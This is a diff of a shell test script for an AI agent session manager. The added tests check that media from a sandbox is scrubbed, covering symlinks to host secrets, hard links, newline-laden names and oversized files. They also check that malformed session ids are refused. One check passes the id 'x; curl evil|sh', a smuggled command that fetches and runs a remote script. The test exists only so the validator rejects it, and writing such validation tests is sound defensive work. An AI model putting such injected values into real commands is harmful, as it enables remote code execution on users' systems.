@@ -91,12 +91,12 @@ _session_turn_running() { [ "$RUNNING" = 1 ]; }
 _session_turn() { echo t >> "$TURNS_FILE"; session_set "$1" turn_open 1 turn_started "$(date +%s)"; }
 reset() { echo "{\"key\":\"agent-t2\",\"state\":\"active\",\"turn_open\":\"1\",\"turn_started\":\"$1\"}" > "$tmp/agent-t2.json"; rm -f "$tmp/agent-t2.queue" "$TURNS_FILE"; }
 
-reset 0; RUNNER='{"type":"system","subtype":"init","session_id":"s1"}
+reset 0; RUNNER='{"type":"system","subtype":"init","session_id":"s1-abcdefgh"}
 '; RUNNING=0
 out="$(cmd_events agent-t2 --since 0)"
 check "dead turn with no result is an error" "error" "$(jq -r '.events[0].type' <<< "$out")"
 check "dead turn closes the turn" "0" "$(session_get agent-t2 turn_open)"
-check "session id captured" "s1" "$(session_get agent-t2 claude_session_id)"
+check "session id captured" "s1-abcdefgh" "$(session_get agent-t2 claude_session_id)"
 
 reset "$(date +%s)"; RUNNING=0
 check "fresh turn gets a grace period" "0" "$(cmd_events agent-t2 --since 0 | jq '.events | length')"
@@ -134,6 +134,18 @@ echo '{"key":"agent-t5","state":"stopped","last_activity":'"$(date +%s)"'}' > "$
 check "snapshot row without media is valid" "agent-t5 0" "$(_snapshot_session_row "$tmp/agent-t5.json" "$(date +%s)" | jq -r '"\(.key) \(.media | length)"')"
 mkdir -p "$tmp/agent-t5.media"; touch "$tmp/agent-t5.media/shot.png" "$tmp/agent-t5.media/notes.html"
 check "snapshot row lists only servable media, with a time" "shot.png true" "$(_snapshot_session_row "$tmp/agent-t5.json" "$(date +%s)" | jq -r '.media | map("\(.name) \(.at > 0)") | join(",")')"
+
+# Media from the sandbox is untrusted: only plain, safely named files survive.
+m="$tmp/scrub"; mkdir -p "$m/sub"; echo secret > "$tmp/host-secret"
+printf 'png' > "$m/ok.png"; ln -s "$tmp/host-secret" "$m/link.mp4"; ln "$m/ok.png" "$m/hard.png" 2>/dev/null
+printf 'x' > "$m/$(printf 'a\n.env\nb.png')"; printf 'x' > "$m/notes.html"; printf 'x' > "$m/sub/deep.png"
+dd if=/dev/zero of="$m/big.webm" bs=1048576 count=51 2>/dev/null
+_session_media_scrub "$m"
+check "media scrub keeps only plain safe files" "" "$(cd "$m" && ls -A | tr '\n' ' ')"
+check "media scrub never touches the link target" "secret" "$(cat "$tmp/host-secret")"
+printf 'png' > "$m/ok.png"; _session_media_scrub "$m"
+check "media scrub keeps a good file" "ok.png" "$(cd "$m" && ls -A)"
+check "a malformed session id is refused" "no yes" "$(_session_valid_sid 'x; curl evil|sh' && echo yes || echo no) $(_session_valid_sid 01a0e2b2-cace-7fd1-834b-ffc1003e19c6 && echo yes || echo no)"
 
 # History: the request, then each reply once, even when the bot re-reads a cursor.
 echo '{"key":"agent-t3","state":"active","turn_open":"1","turn_started":"0"}' > "$tmp/agent-t3.json"
